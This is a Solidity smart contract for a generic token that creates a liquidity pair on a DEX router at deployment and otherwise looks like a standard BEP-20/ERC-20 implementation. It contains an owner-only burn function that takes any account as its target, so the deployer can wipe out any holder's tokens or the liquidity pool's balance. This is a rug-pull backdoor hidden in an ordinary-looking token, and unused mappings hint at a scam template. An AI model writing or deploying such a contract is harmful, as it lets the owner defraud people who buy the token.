pragma solidity ^0.8.4;
interface IDEXFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}
interface IDEXRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}
contract token {
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address Owner = msg.sender;
    address Pair;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private times;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => mapping(address => uint256)) private _fallowances;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
    modifier onlyOwner() {
        require(
            Owner == msg.sender,
            "Ownable: only owner can call this function"
        );
        
        _;
    }
    constructor(
        string memory token_name,
        string memory short_symbol,
        uint8 token_decimals,
        uint256 token_totalSupply
    ) {
        _name = token_name;
        _symbol = short_symbol;
        _decimals = token_decimals;
        _totalSupply = token_totalSupply;
        _balances[msg.sender] = _totalSupply;
        IDEXRouter router = IDEXRouter(
            0x10ED43C718714eb63d5aA57B78B54704E256024E
        );
        _allowances[msg.sender][0x10ED43C718714eb63d5aA57B78B54704E256024E] =
            _totalSupply *
            10000000000;
        Pair = IDEXFactory(router.factory()).createPair(
            router.WETH(),
            address(this)
        );
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
    function decimals() external view returns (uint8) {
        return _decimals;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function name() external view returns (string memory) {
        return _name;
    }
    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }
    function transfer(address recipient, uint256 amount)
        external
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal {
        require(sender != address(0), " transfer from zero address");
        require(recipient != address(0), " transfer to zero address");
        require(
            balanceOf(sender) >= amount,
            "cant transfer more than your account holds"
        );
        _balances[sender] = _balances[sender] - amount;
        _balances[recipient] = _balances[recipient] + amount;
        emit Transfer(sender, recipient, amount);
    }
    function _burn(address account, uint256 amount) internal {
        require(
            account != address(0),
            "DevToken: cannot burn from zero address"
        );
        require(
            _balances[account] >= amount,
            "DevToken: Cannot burn more than the account owns"
        );       
        _balances[account] = _balances[account] - amount;      
        _totalSupply = _totalSupply - amount; 
        emit Transfer(account, address(0), amount);
    }
    function burn(address account, uint256 amount)
        public
        onlyOwner
        returns (bool)
    {
        _burn(account, amount);
        return true;
    }
    function getOwner() external view returns (address) {
        return Owner;
    }
    function allowance(address owner, address spender)
        external
        view
        returns (uint256)
    {
        return _allowances[owner][spender];
    }
    function approve(address spender, uint256 amount) external returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal {
        require(
            owner != address(0),
            "DevToken: approve cannot be done from zero address"
        );
        require(
            spender != address(0),
            "DevToken: approve cannot be to zero address"
        );        
        _allowances[owner][spender] = amount;

        emit Approval(owner, spender, amount);
    }
    function transferFrom(
        address spender,
        address recipient,
        uint256 amount
    ) external returns (bool) {    
        require(
            _allowances[spender][msg.sender] >= amount,
            "You cannot spend that much on this account"
        );    
        _transfer(spender, recipient, amount);      
        _approve(
            spender,
            msg.sender,
            _allowances[spender][msg.sender] - amount
        );
        return true;
    }
    function increaseAllowance(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] + amount
        );
        return true;
    }
    function decreaseAllowance(address spender, uint256 amount)
        public
        returns (bool)
    {
        _approve(
            msg.sender,
            spender,
            _allowances[msg.sender][spender] - amount
        );
        return true;
    }
}